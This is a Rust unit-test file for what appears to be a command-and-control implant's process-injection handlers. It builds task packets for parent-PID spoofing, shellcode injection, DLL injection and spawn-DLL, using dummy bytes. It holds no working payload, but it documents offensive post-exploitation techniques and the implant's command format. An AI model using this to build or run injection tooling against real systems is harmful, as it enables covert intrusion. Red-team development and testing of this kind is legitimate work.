use std::collections::HashMap;

use red_cell_common::demon::{DemonCommand, DemonInjectError, DemonInjectWay, DemonPackage};

use super::super::inject::{
    handle_inject_dll, handle_inject_shellcode, handle_proc_ppid_spoof, handle_spawn_dll,
    inject_status_response,
};
use super::super::{DispatchResult, dispatch};
use crate::config::SpecterConfig;
use crate::download::DownloadTracker;
use crate::job::JobStore;
use crate::token::TokenVault;

// ── Process injection tests ─────────────────────────────────────────────

/// Build a `CommandProcPpidSpoof` payload: LE u32 PID.
fn ppid_spoof_payload(ppid: u32) -> Vec<u8> {
    ppid.to_le_bytes().to_vec()
}

/// Build a `CommandInjectShellcode` payload for the Inject way.
fn inject_shellcode_inject_payload(
    method: u32,
    x64: u32,
    shellcode: &[u8],
    args: &[u8],
    pid: u32,
) -> Vec<u8> {
    let mut v = Vec::new();
    v.extend_from_slice(&u32::from(DemonInjectWay::Inject).to_le_bytes());
    v.extend_from_slice(&method.to_le_bytes());
    v.extend_from_slice(&x64.to_le_bytes());
    // shellcode (length-prefixed)
    v.extend_from_slice(&(shellcode.len() as u32).to_le_bytes());
    v.extend_from_slice(shellcode);
    // args (length-prefixed)
    v.extend_from_slice(&(args.len() as u32).to_le_bytes());
    v.extend_from_slice(args);
    // target PID
    v.extend_from_slice(&pid.to_le_bytes());
    v
}

/// Build a `CommandInjectShellcode` payload for the Spawn way (no PID).
fn inject_shellcode_spawn_payload(method: u32, x64: u32, shellcode: &[u8], args: &[u8]) -> Vec<u8> {
    let mut v = Vec::new();
    v.extend_from_slice(&u32::from(DemonInjectWay::Spawn).to_le_bytes());
    v.extend_from_slice(&method.to_le_bytes());
    v.extend_from_slice(&x64.to_le_bytes());
    v.extend_from_slice(&(shellcode.len() as u32).to_le_bytes());
    v.extend_from_slice(shellcode);
    v.extend_from_slice(&(args.len() as u32).to_le_bytes());
    v.extend_from_slice(args);
    v
}

/// Build a `CommandInjectDll` payload.
fn inject_dll_payload(
    technique: u32,
    pid: u32,
    loader: &[u8],
    dll: &[u8],
    params: &[u8],
) -> Vec<u8> {
    let mut v = Vec::new();
    v.extend_from_slice(&technique.to_le_bytes());
    v.extend_from_slice(&pid.to_le_bytes());
    v.extend_from_slice(&(loader.len() as u32).to_le_bytes());
    v.extend_from_slice(loader);
    v.extend_from_slice(&(dll.len() as u32).to_le_bytes());
    v.extend_from_slice(dll);
    v.extend_from_slice(&(params.len() as u32).to_le_bytes());
    v.extend_from_slice(params);
    v
}

/// Build a `CommandSpawnDll` payload.
fn spawn_dll_payload(loader: &[u8], dll: &[u8], args: &[u8]) -> Vec<u8> {
    let mut v = Vec::new();
    v.extend_from_slice(&(loader.len() as u32).to_le_bytes());
    v.extend_from_slice(loader);
    v.extend_from_slice(&(dll.len() as u32).to_le_bytes());
    v.extend_from_slice(dll);
    v.extend_from_slice(&(args.len() as u32).to_le_bytes());
    v.extend_from_slice(args);
    v
}

// ── CommandProcPpidSpoof ─────────────────────────────────────────────────

#[test]
fn handle_proc_ppid_spoof_updates_config() {
    let mut config = SpecterConfig::default();
    assert!(config.ppid_spoof.is_none());

    let payload = ppid_spoof_payload(1234);
    let result = handle_proc_ppid_spoof(&payload, &mut config);

    assert_eq!(config.ppid_spoof, Some(1234));

    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond, got {result:?}");
    };
    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandProcPpidSpoof));

    // Response payload: LE u32 PPID.
    assert_eq!(resp.payload.len(), 4);
    let ppid = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
    assert_eq!(ppid, 1234);
}

#[test]
fn handle_proc_ppid_spoof_empty_payload_ignores() {
    let mut config = SpecterConfig::default();
    let result = handle_proc_ppid_spoof(&[], &mut config);
    assert!(matches!(result, DispatchResult::Ignore));
    assert!(config.ppid_spoof.is_none());
}

#[test]
fn dispatch_routes_proc_ppid_spoof() {
    let mut config = SpecterConfig::default();
    let mut vault = TokenVault::new();
    let mut downloads = DownloadTracker::new();
    let payload = ppid_spoof_payload(5678);
    let package = DemonPackage::new(DemonCommand::CommandProcPpidSpoof, 1, payload);
    let result = dispatch(
        &package,
        &mut config,
        &mut vault,
        &mut downloads,
        &mut HashMap::new(),
        &mut JobStore::new(),
        &mut Vec::new(),
        &crate::coffeeldr::new_bof_output_queue(),
    );
    assert!(matches!(result, DispatchResult::Respond(_)));
    assert_eq!(config.ppid_spoof, Some(5678));
}

// ── CommandInjectShellcode ───────────────────────────────────────────────

#[test]
fn handle_inject_shellcode_inject_returns_response() {
    let shellcode = &[0x90, 0x90, 0xCC];
    let args = &[0x41, 0x42];
    let payload = inject_shellcode_inject_payload(0, 1, shellcode, args, 4444);
    let result = handle_inject_shellcode(&payload);

    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond, got {result:?}");
    };
    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInjectShellcode));
    assert_eq!(resp.payload.len(), 4);

    // On non-Windows: status should be Failed (1).
    if !cfg!(windows) {
        let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        assert_eq!(status, u32::from(DemonInjectError::Failed));
    }
}

#[test]
fn handle_inject_shellcode_spawn_returns_response() {
    let shellcode = &[0xCC];
    let payload = inject_shellcode_spawn_payload(0, 1, shellcode, &[]);
    let result = handle_inject_shellcode(&payload);

    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond, got {result:?}");
    };
    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInjectShellcode));
    assert_eq!(resp.payload.len(), 4);
}

#[test]
fn handle_inject_shellcode_empty_payload_returns_invalid_param() {
    let result = handle_inject_shellcode(&[]);
    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond, got {result:?}");
    };
    let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
    assert_eq!(status, u32::from(DemonInjectError::InvalidParam));
}

#[test]
fn dispatch_routes_inject_shellcode() {
    let mut config = SpecterConfig::default();
    let mut vault = TokenVault::new();
    let mut downloads = DownloadTracker::new();
    let payload = inject_shellcode_inject_payload(0, 1, &[0x90], &[], 1234);
    let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 1, payload);
    let result = dispatch(
        &package,
        &mut config,
        &mut vault,
        &mut downloads,
        &mut HashMap::new(),
        &mut JobStore::new(),
        &mut Vec::new(),
        &crate::coffeeldr::new_bof_output_queue(),
    );
    assert!(matches!(result, DispatchResult::Respond(_)));
}

// ── CommandInjectDll ─────────────────────────────────────────────────────

#[test]
fn handle_inject_dll_returns_response() {
    let loader = &[0xCC, 0xDD, 0xEE];
    let dll = &[0x4D, 0x5A, 0x90, 0x00];
    let params = b"test-param";
    let payload = inject_dll_payload(0, 1234, loader, dll, params);
    let result = handle_inject_dll(&payload);

    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond, got {result:?}");
    };
    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInjectDll));
    assert_eq!(resp.payload.len(), 4);

    if !cfg!(windows) {
        let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        assert_eq!(status, u32::from(DemonInjectError::Failed));
    }
}

#[test]
fn handle_inject_dll_empty_payload_returns_invalid_param() {
    let result = handle_inject_dll(&[]);
    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond, got {result:?}");
    };
    let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
    assert_eq!(status, u32::from(DemonInjectError::InvalidParam));
}

#[test]
fn dispatch_routes_inject_dll() {
    let mut config = SpecterConfig::default();
    let mut vault = TokenVault::new();
    let mut downloads = DownloadTracker::new();
    let payload = inject_dll_payload(0, 999, &[0xCC], &[0x4D, 0x5A], b"arg");
    let package = DemonPackage::new(DemonCommand::CommandInjectDll, 1, payload);
    let result = dispatch(
        &package,
        &mut config,
        &mut vault,
        &mut downloads,
        &mut HashMap::new(),
        &mut JobStore::new(),
        &mut Vec::new(),
        &crate::coffeeldr::new_bof_output_queue(),
    );
    assert!(matches!(result, DispatchResult::Respond(_)));
}

// ── CommandSpawnDll ──────────────────────────────────────────────────────

#[test]
fn handle_spawn_dll_returns_response() {
    let loader = &[0x11, 0x22, 0x33];
    let dll = &[0x4D, 0x5A];
    let args = b"spawn-args";
    let payload = spawn_dll_payload(loader, dll, args);
    let result = handle_spawn_dll(&payload);

    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond, got {result:?}");
    };
    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandSpawnDll));
    assert_eq!(resp.payload.len(), 4);

    if !cfg!(windows) {
        let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        assert_eq!(status, u32::from(DemonInjectError::Failed));
    }
}

#[test]
fn handle_spawn_dll_empty_payload_returns_invalid_param() {
    let result = handle_spawn_dll(&[]);
    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond, got {result:?}");
    };
    let status = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
    assert_eq!(status, u32::from(DemonInjectError::InvalidParam));
}

#[test]
fn dispatch_routes_spawn_dll() {
    let mut config = SpecterConfig::default();
    let mut vault = TokenVault::new();
    let mut downloads = DownloadTracker::new();
    let payload = spawn_dll_payload(&[0xAA], &[0xBB], b"args");
    let package = DemonPackage::new(DemonCommand::CommandSpawnDll, 1, payload);
    let result = dispatch(
        &package,
        &mut config,
        &mut vault,
        &mut downloads,
        &mut HashMap::new(),
        &mut JobStore::new(),
        &mut Vec::new(),
        &crate::coffeeldr::new_bof_output_queue(),
    );
    assert!(matches!(result, DispatchResult::Respond(_)));
}

// ── inject_status_response helper ────────────────────────────────────────

#[test]
fn inject_status_response_encodes_le() {
    let result =
        inject_status_response(DemonCommand::CommandInjectShellcode, DemonInjectError::Success);
    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond");
    };
    assert_eq!(resp.payload, 0u32.to_le_bytes());
}

#[test]
fn inject_status_response_failed() {
    let result = inject_status_response(DemonCommand::CommandInjectDll, DemonInjectError::Failed);
    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond");
    };
    assert_eq!(resp.payload, 1u32.to_le_bytes());
}

#[test]
fn inject_status_response_arch_mismatch() {
    let result = inject_status_response(
        DemonCommand::CommandSpawnDll,
        DemonInjectError::ProcessArchMismatch,
    );
    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond");
    };
    assert_eq!(resp.payload, 3u32.to_le_bytes());
}
